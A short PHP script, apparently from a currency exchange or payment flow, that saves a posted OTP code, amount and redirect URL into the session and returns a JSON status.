<?php
header("Content-type: application/json; charset=utf-8");
session_start();

if(isset($_POST["otpCode"])){
   $_SESSION["otpCode"] = $_POST["otpCode"];
}

if(isset($_POST["monto"])){
   $_SESSION["monto"] = $_POST["monto"];
}

if(isset($_POST["uniqueUrl"])){
   $_SESSION["urlTo"] = $_POST["uniqueUrl"];
}

if(isset($_POST["endTrx"])){
   if($_POST["endTrx"] == "finalCambio"){
      $_SESSION["urlTo"] = "exchange.php";
   }
}

$result = array("status"=>$_POST["message"]);
echo json_encode($result);